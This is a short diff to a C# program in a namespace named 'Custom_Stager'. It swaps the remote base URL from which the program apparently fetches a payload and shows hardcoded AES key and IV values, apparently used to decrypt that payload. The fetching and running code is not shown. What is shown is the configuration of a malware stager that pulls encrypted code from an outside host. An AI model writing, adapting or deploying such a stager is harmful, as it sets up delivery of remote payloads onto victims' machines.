@@ -12,7 +12,7 @@ namespace Custom_Stager
 {
     class Program
     {
-        private static string baseUrl = "https://www.tecnologico.org/d2fc1b6a458f";
+        private static string baseUrl = "https://cdn.moya.ec/d2fc1b6a458f";
         private static string AESKey = "9ae0c8e048d89fb3";
         private static string AESIV = "789ca1a73299c6e0";
 
